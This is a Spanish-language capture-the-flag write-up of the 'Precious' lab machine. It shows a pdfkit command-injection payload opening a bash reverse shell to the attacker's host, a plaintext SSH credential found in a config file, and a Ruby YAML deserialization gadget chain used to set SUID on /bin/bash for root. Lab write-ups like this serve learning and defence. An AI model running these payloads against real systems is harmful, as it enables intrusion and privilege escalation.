# PreciousWriteup

Comenzamos haciendo un escaneo en nmap

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110171820.png)

Vemos abierto dos puertos el 22 y el 80

~~~
sudo nmap -v -sS -oX vulnerabilidades.xml --stylesheet="https://svn.nmap.org/nmap/docs/nmap.xsl" --script=vuln 10.10.11.189
~~~

Entramos a la página web y vemos que no carga agregamos a /etc/hosts la ip seguida de precious.htb

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110172201.png)

Vemos esta página, para poder copiar otras páginas en PDFs, creamos un server con python -m http.server 80

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110172259.png)

Ponemos nuestro link para que genere el pdf

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110172409.png)

Vemos los metadatos y dice generated by pdfkit v0.8.6

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110172531.png)

Buscamos vulnerabilidades para pdfkit

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110172612.png)

Vemos que permite la ejecucion remota de comandos

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110172642.png)

Lo calamos

~~~
http://example.com/?name=#{'%20`sleep 5`'}
~~~

Vemos que si tarda 5 segs en conectar

Calamos generar un reverse shell

~~~
http://10.10.14.136/?name=#{'%20`bash -c "/bin/bash -i >& /dev/tcp/10.10.14.136/9123 0>&1"`'}
~~~

Damos el -c para que se ejecute bien 

~~~
-c        If the -c option is present, then commands are read from the first non-option argument command_string.  If there are arguments after the command_string, the first argument is assigned to $0 and any remaining argu‐
                 ments are assigned to the positional parameters.  The assignment to $0 sets the name of the shell, which is used in warning and error messages.
       -i        If the -i option is present, the shell is interactive.
~~~

Estamos en /var/www/pdfapp, vamos a home

Damos un ls y no hay nada, damos ls -laRh, para ver carpetas y subcarpetas ocultas

Vemos varias

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110174817.png)

Entramos a ./.bundle

Vemos config y hay como una clave de ssh

~~~
henry:Q3c1AqGHtoI0aXAYFH
~~~

Entramos y ganamos la primera flag

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110175411.png)

Ahora damos sudo -l para ver variables de entorno

![imagen]()

~~~
-l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format is used if this option is specified
                 multiple times and the security policy supports a verbose output format.

                 If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.  If a command is specified but not allowed by the pol‐
                 icy, sudo will exit with a status value of 1
~~~

Nos vamos a opt

A ver el update_dependencies.rb

Vemos que abre un archivo dependencies.yml y no especifica el camino

![imagen](https://github.com/Hamibubu/Writeups/blob/main/PreciousWriteup/Pasted%20image%2020230110175411.png)

Y vemos que tiene permisos de root

Enocntramos que se puede deserializar, con ruby 


~~~
---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
~~~

En git set podemos ejecutar el comando

Ponemos chmod +s /bin/bash

Y hacemos bash -p

Y obtenemos la flag



